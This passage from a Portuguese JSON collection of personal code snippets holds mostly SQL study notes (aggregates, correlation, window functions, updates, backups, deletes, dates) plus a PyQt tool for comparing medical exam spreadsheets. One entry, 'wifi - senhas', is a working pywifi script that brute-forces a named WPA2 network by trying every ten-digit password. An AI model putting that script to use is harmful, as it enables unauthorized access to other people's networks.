time=0.055..289.426 rows=3336 loops=1) \nFilter: ((street)::text = 'BROADWAY'::text) \nRows Removed by Filter: 937038 \nPlanning time: 0.617 ms \n\u278b Execution time: 289.838 ms \nCREATE INDEX street_idx ON new_york_addresses (street); "}, "Fun\u00e7\u00f5es agregadas - para analizar as tabelas": {"categoria": "SQL ", "codigo": "--Contas quantas linha tem\nSELECT count(*) \nFROM pls_fy2014_pupld14a; \n\n-- Para contar a quantidade de linhas que\n--tem valores de uma determinada coluna\nSELECT count(salaries) \nFROM pls_fy2014_pupld14a;  \n\n--Conta quantos valores distintos tem\nSELECT count(DISTINCT libname) \nFROM pls_fy2014_pupld14a; \n\n--Retorna o valor m\u00e1ximo e m\u00ednimo\nSELECT max(visits), min(visits) \nFROM pls_fy2014_pupld14a; \n\nSELECT stabr \nFROM pls_fy2014_pupld14a \n\u278a GROUP BY stabr \nORDER BY stabr; \n\nSELECT city, stabr \nFROM pls_fy2014_pupld14a \nGROUP BY city, stabr \nORDER BY city, stabr; \n\n/*Seleciona pela coluna stabr e conta\ntodos as quantidades de cada um*/\nSELECT stabr, count(*)\nFROM pls_fy2014_pupld14a\nGROUP BY stabr\nORDER BY count(*) DESC;\n\n\n\n/* O length() transforma cada linha\nda coluna zip em quantidade de\ncaracteres, faz uma coluna para contando\nquantas vezes as quantidades de caracteres\napareceram\n\n*/\n\nSELECT length(zip),\ncount(*) AS length_count\nFROM meat_poultry_egg_inspect\nGROUP BY length(zip)\nORDER BY length(zip) ASC;\n\n\n/* Usamos a correla\u00e7\u00e3o corr(y, x) para\nidentificar se od dados tem rela\u00e7\u00e3o entre si,\nisso serve para sabermos se a medida que algo aumenta\noutro dado aumenta tamb\u00e9m.\n0 - sem rela\u00e7\u00e3o\n.01 - .29 rela\u00e7\u00e3o fraca\n.3 at\u00e9 .59 rela\u00e7\u00e3o moderada\n.6 at\u00e9 .99 rela\u00e7\u00e3o forte perto de perfeita\n1 - rela\u00e7\u00e3o perfeita\no valor de x \u00e9 a vari\u00e1vel independente \no valor de y \u00e9 a vari\u00e1vel dependente\n\n*/\nSELECT corr(median_hh_income, pct_bachelors_higher)\n\tAS bachelors_income_r\nFROM acs_2011_2015_stats;\n\n\n\n\n/*Usamos o round para arredondar o valores resultantes\npara duas casas decimais e nomeamos as colunas\nusamo o corr para medir a correla\u00e7\u00e3o entre os dados.\ndessa forma conseguimos ter v\u00e1rios resultados de \ncorrela\u00e7\u00f5es de uma s\u00f3 vez\n*/\nSELECT \n\tround(\n\tcorr(median_hh_income, pct_bachelors_higher) :: numeric, 2)\n\tAS bachelors_income_r,\n\t\n\tround(\n\tcorr(pct_travel_60_min, median_hh_income) :: numeric, 2)\n\tAS income_travel_r,\n\t\t\n\tround(\n\tcorr(pct_travel_60_min, pct_bachelors_higher) :: numeric, 2)\n\tAS bachelors_trabel_r\nFROM acs_2011_2015_stats;\n\n\n\n\n/* Seleciona as duas colunas e e o regr_slope\ncalulca a inclina\u00e7\u00e3o da linha de regress\u00e3o,\nde duas vari\u00e1veis, \nja o regr_intercept calcula\nos valor dos x das mesmas segundas vari\u00e1veis\nno numero produzido pelo slope \u00e9 a inclina\u00e7\u00e3o da\nlinha\nY = b(30) + a\nb = regr_slope\na = regr_intercept\n*/\nSELECT \n\tround(\n\t\tregr_slope(median_hh_income, pct_bachelors_higher) :: numeric, 2)\n\t\tAS slope,\n\tround(\n\t\tregr_intercept(median_hh_income, pct_bachelors_higher) :: numeric, 2)\n\t\tAS y_intercept\n\tFROM acs_2011_2015_stats;\n\n\n\n\n\n\n/*Calulamos o ceficiente de correla\u00e7\u00e3o r antes, \no que significa qual o n\u00edvel medido de correla\u00e7\u00e3o\nmedido entre duas vari\u00e1veis, por\u00e9m isso n\u00e3o se aplica a todos,\ne o regr_r2 eleva o resultado de correla\u00e7\u00e3o entre duas vari\u00e1veis\nao quadrado, evidenciando at\u00e9 quando essa correla\u00e7\u00e3o \u00e9 v\u00e1lida,\npor exemplo, o r = 0.68 e o r**2 = 0.46, isso significa que\n46% da correla\u00e7\u00e3o \u00e9 causada pela vari\u00e1vel fixa\n*/\nSELECT \n\tround(\n\t\tregr_r2(median_hh_income, pct_bachelors_higher) :: numeric, 3)\n\t\tAS r_squared\nFROM acs_2011_2015_stats;\n\n\n#######################################################\n/* FUN\u00c7\u00d5ES DE JANELA\nSelecionamos as colunas da tabela que vamos\nusar, logo em seguida usamos a fun\u00e7\u00e3o \nrank() ou dense_rank() seguido de OVER()\nque diz que a fun\u00e7\u00e3o a um conjunto de linhas\ndefinido pela clausula ORDER BY que ordena em \nordem descrescente\nrank() = evidencia quantas 'empresas' est\u00e3o a cima\ndense_rank() = evidencia o lugar que a 'empresa' \nest\u00e1 localizada, desconsiderando quantas 'empresas' tem\ndevido ao empate\n*/\nSELECT company, widget_output, \nrank() OVER(ORDER BY widget_output DESC),\ndense_rank() OVER(ORDER BY widget_output DESC)\nFROM widget_companies;\n\n\n/*Selecionamos as colunas que vamos consultas/utilizar\nutilizamos o rank() junto com o PARTITION BY,\no PARTITION BY vai ranquear de acordo com a coluna selecionada\n1, 2, 3 de cada categoria \ncategoria a = 1, 2, 3 lugar\ncategoria b = 1, 2, 3 lugar\n*/\nSELECT category, store, unit_sales,\nrank() OVER(PARTITION BY category ORDER BY unit_sales DESC)\nFROM store_sales;\n\t\n\t\n\t"}, "ALTER ou UPDATE - modificar tabelas": {"categoria": "SQL ", "codigo": "ALTER TABLE table ADD COLUMN column data_type; \nALTER TABLE table DROP COLUMN column; \nALTER TABLE table ALTER COLUMN column SET DATA TYPE data_type; \nALTER TABLE table ALTER COLUMN column SET NOT NULL; \nALTER TABLE table ALTER COLUMN column DROP NOT NULL; \n\nUPDATE table \nSET column = value; \n\nUPDATE table \nSET column_a = value, \ncolumn_b = value; \n\nUPDATE table \nSET column = value \nWHERE criteria; \n\nUPDATE table \nSET column = (SELECT column \nFROM table_b \nWHERE table.column = table_b.column) \nWHERE EXISTS (SELECT column \nFROM table_b \nWHERE table.column = table_b.column); \n\nUPDATE table \nSET column = table_b.column \nFROM table_b \nWHERE table.column = table_b.column; \n\n\n/* na tabela selecionanda e na coluna\nselecionanada, vamos modificar o valor\nna linha que que na coluna est_number\nseja explicitada, dessa forma conseguimos\nmudar os dados onde desejamos*/\nUPDATE meat_poultry_egg_inspect\nSET st = 'MN'\nWHERE est_number = 'V18677A';\n\n\n\n/* Selecionamos a tabela que iremos modificar\nselecionamos a coluna e dizemos o que ele vai mudar\ne em seguida, explicitamos a parte da palavra que \nest\u00e1 presente no dado inserido indevidamente\n, dessa forma o c\u00f3digo procura linha a linha\ne modifica a linha que corresponde a restri\u00e7\u00e3o\n*/\n\nUPDATE meat_poultry_egg_inspect SET company_standard = 'Armour-Eckrich Meats'\nWHERE company LIKE 'Armour%';\n\n/* Aqui verificamos que os nomes foram alterados de forma padr\u00e3o agora*/\nSELECT company, company_standard FROM meat_poultry_egg_inspect \nWHERE company LIKE 'Armour%';\n\n\n/* Selecionamos a tabela que iremos mudar os\ndados depois do SET, dizemos que a linha da \ncoluna zip, o dado seja concatenado\nisso significa que o '00' ser\u00e1 acrescentado\nno dado ja existente na coluna ja existente\nem seguida colocamos uma restri\u00e7\u00e3o WHERE\nonde especificamos a coluna st e a mudan\u00e7a\ndeve ocorrer caso as linhas forem iguais a\n'PR', 'VI' e tamb\u00e9m cujo tamanho do dado \npresente na linha da coluna zip, seja igual\na 3\n*/\nUPDATE meat_poultry_egg_inspect\nSET zip = '00' || zip\nWHERE st IN('PR', 'VI') AND length(zip) = 3;\n\n\n/* Selecionamos a tabela que iremos modificar\nnessa mesma tabela temos a coluna inspection_date\ne vamos seta-la na data especificada por n\u00f3s,\ncolocamos um restri\u00e7\u00e3o para localizar a linha que \nser\u00e1 feira a mudan\u00e7a, \nselecionamos em seguida, a coluna region da tabela\nstate_regions\n*/\nUPDATE meat_poultry_egg_inspect inspect\nSET inspection_date = '2019-12-01'\nWHERE EXISTS(\n\tSELECT state_regions.region FROM state_regions\n\tWHERE inspect.st = state_regions.st AND\n\t\tstate_regions.region = 'New England');\n\n\n\n\n/*Trocando o nome das tabelas */\nALTER TABLE meat_poultry_egg_inspect RENAME TO meat_poultry_egg_inspect_temp;\n"}, "backup de tabelas - para caso perca dados que precisava na analise": {"categoria": "SQL ", "codigo": "CREATE TABLE meat_poultry_egg_inspect_backup AS \nSELECT * FROM meat_poultry_egg_inspect; \n\nSELECT \n(SELECT count(*) FROM meat_poultry_egg_inspect) AS original, \n(SELECT count(*) FROM meat_poultry_egg_inspect_backup) AS backup; \n\n/*Primeiro n\u00f3s alteramos a tabela que desejamos, adicionando uma nova coluna,\nessa nova coluna \u00e9 nomeada com st_copy, pois ser\u00e1 uma copia\nde uma coluna existente, logo em seguida, utilizamos o UPDATE \npara adiconar os dados na coluna que criamos antes com os dados \nde uma outra coluna j\u00e1 existente , observe que \nas duas colunas est\u00e3o na mesma tabela*/\n\nALTER TABLE meat_poultry_egg_inspect ADD COLUMN st_copy varchar(2); \nUPDATE meat_poultry_egg_inspect \nSET st_copy = st; \n\n\n/* Primeiramente selecionamos a tabela que\nvamos modificar(fazer backup) e nomeamos ela\ncomo 'original', dizemos que a coluna st = \nbackup.st pois vamos pegar esses dados da tabela\nde backup e fazemos uma restri\u00e7\u00e3o para\ncertificar que cada linha seja preenchida de\nacordo com a chave prim\u00e1ria\n*/\nUPDATE meat_poultry_egg_inspect original\nSET st = backup.st\nFROM meat_poultry_egg_inspect_backup backup\nWHERE original.est_number = backup.est_number;\n\n\n/* Primeiramente informamos que comecar\u00e1 um a bloco, \nem seguida fazemos as modifica\u00e7\u00f5es que queromos fazer,\ncaso cometemos algum erro, usamos o comando \nROLLBACK; para voltar para a situa\u00e7\u00e3o anterior de \nfazermos altera\u00e7\u00f5es*/\nSTART TRANSACTION;\n\nUPDATE meat_poultry_egg_inspect  \nSET company = 'AGRO Merchantss Oakland LLC' \nWHERE company = 'AGRO Merchants Oakland, LLC'; \n\nSELECT company FROM meat_poultry_egg_inspect WHERE company LIKE 'AGRO%' ORDER BY company; \n\nROLLBACK;\n\n\n/*Criamos uma nova tabela selecionando todas as colunas\nda tabela antiga e adicionando mais uma coluna que\nser\u00e1 preenchida por um dado igual em todas as linhas\nisso economiza espa\u00e7o no banco de dados, j\u00e1 que\nao criar uma coluna por vez em uma tabela existente\natualiza as linhas, mas n\u00e3o exclui as linhas antigas\n*/\nCREATE TABLE meat_poultry_egg_inspect_backup AS\nSELECT *,\n\t\t'2018-02-7'::date AS\nreviewd_date FROM meat_poultry_egg_inspect;"}, "deletando - deletar tabelas, linhas, colunas e etc..,": {"categoria": "SQL ", "codigo": "/*Deleta todas as linhas de uma tabela*/\nDELETE FROM table_name;\n\n/* Para deletar toda uma tabela de um banco de dados*/\nDROP TABLE table_name;\n\n/* Deleta a linha que voc\u00ea deseja usando uma restri\u00e7\u00e3o*/\nDELETE FROM meat_poultry_egg_inspect\nWHERE st IN('PR', 'VI');\n\n/* Exclui uma coluna selecionada na tabela tamb\u00e9m\nselecionada */\nALTER TABLE table_name DROP COLUMN column_name;"}, "wifi - senhas": {"codigo": "import pywifi\nfrom pywifi import const\nimport itertools\nimport string\nimport time\nimport json\n\ndef conectar_wifi(nome_rede, senhas):\n\twifi = pywifi.PyWiFi()\n\tinterface = wifi.interfaces()[0]  # obt\u00e9m a primeira interface WiFi dispon\u00edvel\n\n\tinterface.disconnect()  # desconecta de qualquer rede j\u00e1 conectada\n\n\tperfil = pywifi.Profile()  # cria um perfil para a nova rede\n\tperfil.ssid = nome_rede  # define o SSID da rede\n\tperfil.auth = const.AUTH_ALG_OPEN  # define o tipo de autentica\u00e7\u00e3o (no caso, aberta)\n\tperfil.akm.append(const.AKM_TYPE_WPA2PSK)  # define o tipo de criptografia (WPA2-PSK)\n\tperfil.cipher = const.CIPHER_TYPE_CCMP  # define o tipo de cifra (CCMP)\n\n\tinterface.remove_all_network_profiles()  # remove todos os perfis de rede\n\n\tfor senha in senhas:\n\t\tperfil.key = senha  # define a senha da rede\n\n\t\tnovo_perfil = interface.add_network_profile(perfil)  # adiciona o novo perfil\n\n\t\tinterface.connect(novo_perfil)  # tenta conectar \u00e0 rede usando o perfil criado\n\n\t\t# Aguarda a conex\u00e3o ser estabelecida por 10 segundos\n\t\t#for _ in range(10):\n\t\tif interface.status() == const.IFACE_CONNECTED:\n\t\t\tprint(\"Conectado \u00e0 rede:\", nome_rede)\n\t\t\treturn True\n\t\t\t\n            \n\n\tprint(\"Falha ao conectar \u00e0 rede.\")\n\treturn False\n\ndef gerar_senhas():\n\tprint('Gerando senhas...')\n\n\tcaracteres = string.digits\n\ttodas_combinacoes = itertools.product(caracteres, repeat=10)\n\tsenhas = [''.join(combinacao) for combinacao in todas_combinacoes]\n\tprint(f'{len(senhas)} senhas geradas...')\n\treturn senhas\n\t\t\t\t\nsenhas = gerar_senhas()\nsenhas.insert(100, 'samuel144')\n\n# Exemplo de uso\nnome_rede = \"VSISTEM TOTAL\"\n#senhas = [\"samuel144\" ]  # Adicione mais senhas conforme necess\u00e1rio\nprint('Testando senhas')\nconectar_wifi(nome_rede, senhas)\nprint('')\n\n", "categoria": "Programas exemplos"}, "conc": {"categoria": "Programas exemplos", "codigo": "import sys\nimport json\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QPushButton, QComboBox,\nQTableWidget, QTableWidgetItem, QLineEdit, QGridLayout, QLabel, QMessageBox)\nfrom datetime import datetime\nimport pandas as pd\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(800, 600)\n\t\tself.setWindowTitle('Trap Work')\n\t\tself.tasy_dic = {} #dados dos medicos executores\n\t\tself.assinado_dic = {} #dados dos medicos assinantes\n\t\tself.carregar_dados()\n\t\tself.tratamento_dados()\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\t'''Tasy = executor\n\t\tassinante = assinante'''\n\tdef setUpMainWindow(self):\n\t\t#Barra para pesquisar os nomes do clientes\n\t\tself.barra_pesquisa_edit = QLineEdit()\n\t\tself.barra_pesquisa_edit.setClearButtonEnabled(True)\n\t\tself.barra_pesquisa_edit.textEdited.connect(self.combobox)\n\t\t\n\t\t#Botao para selecionar os nomes no ComboBox\n\t\tself.situacao_label = QLabel('Situa\u00e7\u00e3o: Sistema sem dados')\n\t\tif self.tasy_dic and self.assinado_dic:\n\t\t\tself.situacao_label.setText('Situa\u00e7\u00e3o: Sistema com dados...')\n\t\t\n\t\t#Nomes selecionados da tabela tasy\n\t\tself.tasy_combobox = QComboBox()\n\t\t\n\t\t#Nomes selecionados da tabela executado\n\t\tself.assinado_combobox = QComboBox()\n\t\t\n\t\t#Botao que pesquisa no tasy\n\t\tself.botao_pesquisar_tasy = QPushButton('Pesquisar Tasy')\n\t\tself.botao_pesquisar_tasy.clicked.connect(self.setTabelaTasy)\n\t\t\n\t\t#Botao que pesquisa no assinado\n\t\tself.botao_pesquisar_assinado = QPushButton('Pesquisar Assin')\n\t\tself.botao_pesquisar_assinado.clicked.connect(self.setTabelaAssinado)\n\t\t\n\t\t\n\t\t\n\t\t#Textos para diferenciar coluanas\n\t\ttexto_tasy = QLabel('Tasy')\n\t\ttexto_assinado = QLabel('Assinado')\n\t\t\n\t\t#Tabela que mostra que executou\n\t\tself.tasy_table = QTableWidget(len(list(self.tasy_dic)), 4)\n\t\t\n\t\t#Tabela que mostra que assinou\n\t\tself.assinado_table = QTableWidget(len(list(self.assinado_dic)), 4)\n\t\t\n\t\t\n\t\tbotao_importar_dados = QPushButton('Importar e atualizar os dados')\n\t\tbotao_importar_dados.clicked.connect(self.importar_dados)\n\t\tbotao_importar_dados.clicked.connect(self.tratamento_dados)\n\t\t\n\t\tself.main_grid = QGridLayout()\n\t\tself.main_grid.addWidget(self.barra_pesquisa_edit, 0, 0)\n\t\tself.main_grid.addWidget(self.situacao_label, 0, 1)\n\t\tself.main_grid.addWidget(self.tasy_combobox, 1, 0)\n\t\tself.main_grid.addWidget(self.assinado_combobox, 1, 1)\n\t\tself.main_grid.addWidget(self.botao_pesquisar_tasy, 2, 0)\n\t\tself.main_grid.addWidget(self.botao_pesquisar_assinado, 2, 1)\n\t\tself.main_grid.addWidget(texto_tasy, 3, 0)\n\t\tself.main_grid.addWidget(texto_assinado, 3, 1)\n\t\tself.main_grid.addWidget(self.tasy_table, 4, 0)\n\t\tself.main_grid.addWidget(self.assinado_table, 4, 1)\n\t\tself.main_grid.addWidget(botao_importar_dados, 5, 0, 1, 2)\n\t\tself.setLayout(self.main_grid)\n\t\tself.atualizar_pagina()\n\t\n\t\n\tdef atualizar_pagina(self):\n\t\tself.combobox()\t\n\t\tself.setTabelaTasy()\n\t\tself.setTabelaAssinado()\n\n\t\n\tdef combobox(self):\n\t\tself.tratamento_dados()\n\t\tself.tasy_combobox.clear()\n\t\tself.assinado_combobox.clear()\n\t\t\n\t\ttexto = self.barra_pesquisa_edit.text()\n\t\t\n\t\tlista_combo_tasy = []\n\t\tlista_combo_assinado = []\n\t\t\n\t\t\n\t\t#ComboBox tasy\n\t\tif texto == '':\n\t\t\tfor chave, value in self.tasy_dic.items():\n\t\t\t\tif value['NOME'] in lista_combo_tasy:\n\t\t\t\t\tpass\n\t\t\t\tif value['NOME'] not in lista_combo_tasy:\n\t\t\t\t\tlista_combo_tasy.append(value['NOME'])\n\t\t\n\t\t\n\t\tif texto != '':\n\t\t\tfor chave, value in self.tasy_dic.items():\n\t\t\t\tif texto in value['NOME']:\n\t\t\t\t\tif value['NOME'] in lista_combo_tasy:\n\t\t\t\t\t\tpass\n\t\t\t\t\tif value['NOME'] not in lista_combo_tasy:\n\t\t\t\t\t\t\n\t\t\t\t\t\tlista_combo_tasy.append(value['NOME'])\n\t\t\n\t\t#COmboBoxAssinado\n\t\tif texto == '':\n\t\t\tfor chave, value in self.assinado_dic.items():\n\t\t\t\tif value['BENEFICI\u00c1RIO'] in lista_combo_assinado:\n\t\t\t\t\tpass\n\t\t\t\tif value['BENEFICI\u00c1RIO'] not in lista_combo_assinado:\n\t\t\t\t\tlista_combo_assinado.append(value['BENEFICI\u00c1RIO'])\n\t\t\t\t\t\n\t\tif texto != '':\n\t\t\tfor chave, value in self.assinado_dic.items():\n\t\t\t\tif texto in value['BENEFICI\u00c1RIO']:\n\t\t\t\t\tif value['BENEFICI\u00c1RIO'] in lista_combo_assinado:\n\t\t\t\t\t\tpass\n\t\t\t\t\tif value['BENEFICI\u00c1RIO'] not in lista_combo_assinado:\n\t\t\t\t\t\tlista_combo_assinado.append(value['BENEFICI\u00c1RIO'])\n\t\t\t\t\t\t\n\t\ttry:\n\t\t\tself.assinado_combobox.addItems(lista_combo_assinado)\n\t\texcept:\n\t\t\tpass\t\n\t\t\t\t\n\t\t\n\t\t\n\t\t\n\t\ttry:\n\t\t\tself.tasy_combobox.addItems(lista_combo_tasy)\n\t\texcept:\n\t\t\tpass\n\t\t\t\t\n\t\n\tdef setTabelaTasy(self):\n\t\tdic_tasy = {}\n\t\tself.tasy_table.setRowCount(len(list(self.tasy_dic)))\n\t\tcliente_tasy = self.tasy_combobox.currentText()\n\t\tself.tasy_table.clear()\n\t\t\n\t\t#Inserindo as colunas\n\t\t#Inserindo os nomes das colunas\n\t\t#Clientes\n\t\tself.tasy_table.setHorizontalHeaderItem(\n\t\t\t0,QTableWidgetItem('Cliente'))\n\t\t\n\t\t#M\u00e9digo executor\t\n\t\tself.tasy_table.setHorizontalHeaderItem(\n\t\t\t1,QTableWidgetItem('M\u00e9dico Executor'))\n\t\t\n\t\t#Exame\n\t\tself.tasy_table.setHorizontalHeaderItem(\n\t\t\t3,QTableWidgetItem('Exame'))\n\t\t\t\n\t\t#Data\n\t\tself.tasy_table.setHorizontalHeaderItem(\n\t\t\t2,QTableWidgetItem('Data'))\n\t\n\t\tif self.barra_pesquisa_edit.text() == '':\n\t\t\tfor chave, valor in self.tasy_dic.items():\n\t\t\t\n\t\t\t\tdic_tasy[chave] = valor\n\t\n\t\tif self.barra_pesquisa_edit.text() != '':\n\t\t\tfor chave, valor in self.tasy_dic.items():\n\t\t\t\tif cliente_tasy == valor['NOME']:\n\t\t\t\t\tdic_tasy[chave] = valor\n\t\n\t\tvar = 0\n\t\tfor chave, valor in dic_tasy.items():\n\t\t\tself.tasy_table.setItem(\n\t\t\tvar, 0, QTableWidgetItem(valor['NOME']))\n\t\t\t\n\t\t\tself.tasy_table.setItem(\n\t\t\tvar, 1, QTableWidgetItem(valor['M\u00c9DICO']))\n\t\t\t\n\t\t\tself.tasy_table.setItem(\n\t\t\tvar, 3, QTableWidgetItem(valor['DESCRI\u00c7\u00c3O']))\n\t\t\t\n\t\t\tif isinstance(valor['DATA'], int):\n\t\t\t\tvalor['DATA'] = datetime.fromordinal(datetime(1900, 1, 1).toordinal() + valor['DATA'] - 2)\t\t\t\n\t\t\tdata_formatada = valor['DATA'].strftime('%d-%m-%y')\n\t\t\t\n\t\t\tself.tasy_table.setItem(\n\t\t\tvar, 2, QTableWidgetItem(data_formatada))\n\t\t\t\n\t\t\tvar += 1\n\t\t\n\t\tself.tasy_table.resizeColumnsToContents()\n\n\tdef setTabelaAssinado(self):\n\t\tdic_assinado = {}\n\t\tself.assinado_table.setRowCount(len(list(self.assinado_dic)))\n\t\tcliente_assinado = self.assinado_combobox.currentText()\n\t\tself.assinado_table.clear()\n\t\t\n\t\t#Inserindo as colunas\n\t\t#Inserindo os nomes das colunas\n\t\t#Clientes\n\t\tself.assinado_table.setHorizontalHeaderItem(\n\t\t\t0,QTableWidgetItem('Cliente'))\n\t\t\n\t\t#M\u00e9digo executor\t\n\t\tself.assinado_table.setHorizontalHeaderItem(\n\t\t\t1,QTableWidgetItem('M\u00e9dico Assinante'))\n\t\t\n\t\t#Exame\n\t\tself.assinado_table.setHorizontalHeaderItem(\n\t\t\t3,QTableWidgetItem('Exame'))\n\t\t\t\n\t\t#Data\n\t\tself.assinado_table.setHorizontalHeaderItem(\n\t\t\t2,QTableWidgetItem('Data'))\n\t\t\t\n\t\tif self.barra_pesquisa_edit.text() == '':\n\t\t\tfor chave, valor in self.assinado_dic.items():\n\t\t\t\tdic_assinado[chave] = valor\n\t\ttry:\n\t\t\tif self.barra_pesquisa_edit.text() != '':\n\t\t\t\tfor chave, valor in self.assinado_dic.items():\n\t\t\t\t\tif cliente_assinado == valor['BENEFICI\u00c1RIO']:\n\t\t\t\t\t\tdic_assinado[chave] = valor\n\t\texcept:\n\t\t\tQMessageBox.warning(self, 'Error no carregamento de dados',\n\t\t\t'Verifique se as colunas est\u00e3o com o nome padr\u00e3o',\n\t\t\tQMessageBox.StandardButton.Ok,\n\t\t\tQMessageBox.StandardButton.OK)\n\t\t\t\t\t\n\t\tvar = 0\n\t\tfor chave, valor in dic_assinado.items():\n\t\t\tself.assinado_table.setItem(\n\t\t\tvar, 0, QTableWidgetItem(valor['BENEFICI\u00c1RIO']))\n\t\t\t\n\t\t\tself.assinado_table.setItem(\n\t\t\tvar, 1, QTableWidgetItem(str(valor['M\u00c9DICO ASSINANTE'])))\n\n\t\t\tif isinstance(valor['REALIZA\u00c7\u00c3O'], int):\n\t\t\t\tvalor['REALIZA\u00c7\u00c3O'] = datetime.fromordinal(datetime(1900, 1, 1).toordinal() + valor['REALIZA\u00c7\u00c3O'] - 2)\n\t\t\telif isinstance(valor['REALIZA\u00c7\u00c3O'], float):\n    # Se 'REALIZA\u00c7\u00c3O' for um float, converta-o para um objeto de data\n\t\t\t\tvalor['REALIZA\u00c7\u00c3O'] = datetime.fromordinal(datetime(1900, 1, 1).toordinal() + int(valor['REALIZA\u00c7\u00c3O']) - 2)\n\t\t\tdata_formatada = valor['REALIZA\u00c7\u00c3O'].strftime('%d-%m-%y')\n\t\t\t\n\t\t\t\n\t\t\tself.assinado_table.setItem(\n\t\t\tvar, 2, QTableWidgetItem(data_formatada))\n\t\t\t\n\t\t\tself.assinado_table.setItem(\n\t\t\tvar, 3, QTableWidgetItem(valor['PROCEDIMENTO']))\n\t\t\t\n\t\t\tvar += 1\n\t\n\t\t\n\t\n\n\t\t\t\n\n\t\t\t\t\t\n\t\t\t\n\n\t\t\t\t\t\n\t\t\t\t\n\n\t\tself.assinado_table.resizeColumnsToContents()\n\t\t\n\t\t\n\t\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\tdef importar_dados(self):\n\t\t#Tabela tasy para o dicionario self.tasy_dic\n\t\tdf = pd.read_excel('planilhas_import/tasy.xlsx')\n\t\tself.tasy_dic = df.set_index(df.columns[0]).to_dict(orient='index')\n\t\t#Salvando o dicionario em json\n\t\ttry:\n\t\t\tfor chave, valor in self.tasy_dic.items():\n\t\t\t\tvalor['NOME'] = valor['NOME'].lower()\n\t\texcept:\n\t\t\tpass\t\t\n\t\ttry:\n\t\t\twith open('base_data/tasy.json', 'w') as file:\n\t\t\t\tjson.dump(self.tasy_dic, file)\n\t\texcept:\n\t\t\tpass\n\t\t\t'''\n\t\t\tresposta = QMessageBox.information(self, 'Error de importa\u00e7\u00e3o',\n\t\t\t'Error ao importar os dados tasy para json',\n\t\t\tQMessageBox.StandardButton.Ok,\n\t\t\tQMessageBox.StandardButton.Ok)\n\t\t'''\n\t\t#Tabela assinante para o dicionario self.assinado_dic\n\t\tdf_ex = pd.read_excel('planilhas_import/assinante.xlsx')\n\t\tself.assinado_dic = df_ex.set_index(df_ex.columns[0]).to_dict(orient='index')\n\n\t\ttry:\n\t\t\tfor chave, valor in self.assinado_dic.items():\n\t\t\t\tvalor['BENEFICI\u00c1RIO'] = str(valor['BENEFICI\u00c1RIO']).lower()\n\t\texcept:\n\t\t\tpass\n\n\t\t\n\t\t#Salvando o dicionario em json\n\t\ttry:\n\t\t\twith open('base_data/assinado.json', 'w') as file:\n\t\t\t\tjson.dump(self.assinado_dic, file)\n\t\t\t\tself.situacao_label.setText('Situa\u00e7\u00e3o: Sistema com dados...')\n\t\texcept:\n\t\t\t'''\n\t\t\tresposta = QMessageBox.information(self, 'Error de importa\u00e7\u00e3o',\n\t\t\t'Error ao importar os dados assinados para json',\n\t\t\tQMessageBox.StandardButton.Ok,\n\t\t\tQMessageBox.StandardButton.Ok)'''\n\t\t\tpass\n\t\t\n\t\t#Toda vez que entrar dados novos, a p\u00e1gina ser\u00e1 atualizada\n\t\tself.atualizar_pagina()\n\t\t\t\n\tdef carregar_dados(self):\n\t\t#Carregar dados para o dic self.tasy_dic\n\t\ttry:\n\t\t\twith open('base_data/tasy.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.tasy_dic.update(json.loads(content))\n\t\texcept:\n\t\t\t\n\t\t\tpass\n\t\t\n\t\t#Carregando dados para o dic self.assindado_dic\n\t\ttry:\n\t\t\twith open('base_data/assinado.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.assinado_dic.update(json.loads(content))\n\t\texcept:\n\t\t\tpass\n\t\n\tdef tratamento_dados(self):\n\t\ta =1\n\t\t\n\t\t\n\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "Importando planilha excel para um dicion\u00e1rio": {"codigo": "import pandas as pd\n\n'''Precisamos ter uma coluna com numeros n\u00e3o repetidos para importar\na planilha para um dicion\u00e1rio'''\ndf = pd.read_excel('planilhas_import/tasy.xlsx')\ndicionario = df.set_index(df.columns[0]).to_dict(orient='index')", "categoria": "Pandas"}, "Data e Horas ": {"categoria": "SQL ", "codigo": "date:\nRegistra apenas data, aceita v\u00e1rios formatos de datas, como por exemplo\n21st day of September 2018, September 21, 2018 ou 9/21/2018. \u00c9 recomendado\nusar YYYY-MM-DD ou 2018-09-21 pois \u00e9 a linguagem universal de dados\n\ntime:\nRegistra apenas hora. Adiciona tambem o time zone torna a coluna ciente do\nfuso hor\u00e1rio. O formato padr\u00e3o iso \u00e9 HH:MM:SS\n\ntimestamp:\nRegistra data e hora. Voc\u00ea pode adicionar o with time zone para tornar a coluna \nxiente do fuso hor\u00e1rio. Pode combinar par usar a data e hora com o fuso horario \nno final YYYY-MM-DD HH:MM:SS TZ.\n\ninterval:\nN\u00e3o registra o in\u00edcio ou fim, registra apenas a dura\u00e7\u00e3o, como por exemplo:\n12 dias ou 8 horas.\n\n\n/*Aqui conseguimos separar as partes das datas \nde acordo com o nosso interesse\n*/\nSELECT date_part('year', '2019-12-01 18:37:12 EST'::timestamptz) AS \"ano\", \n\tdate_part('month', '2019-12-01 18:37:12 EST'::timestamptz) AS \"mes\", \n\tdate_part('day', '2019-12-01 18:37:12 EST'::timestamptz) AS \"hora\", \n\tdate_part('minute', '2019-12-01 18:37:12 EST'::timestamptz) AS \"minuto\", \n\tdate_part('seconds', '2019-12-01 18:37:12 EST'::timestamptz) AS \"segundos\", \t\t\tdate_part('timezone_hour', '2019-12-01 18:37:12 EST'::timestamptz) AS \"tz\", \n\tdate_part('week', '2019-12-01 18:37:12 EST'::timestamptz) AS \"semana\", \n\tdate_part('quarter', '2019-12-01 18:37:12 EST'::timestamptz) AS \"quarto\", \n\tdate_part('epoch', '2019-12-01 18:37:12 EST'::timestamptz) AS \"epoch\";\n\n\n/*Podemos usar o \nextract('year' from '2019-12-01 18:37:12 EST'::timestamptz)\n*/\n\n\n/*\nAs vezes os dados das datas est\u00e3o separadas por colunas e voce precisa juntar\ntudo em uma so coluna com o formato de data\n*/\nSELECT make_date(2018, 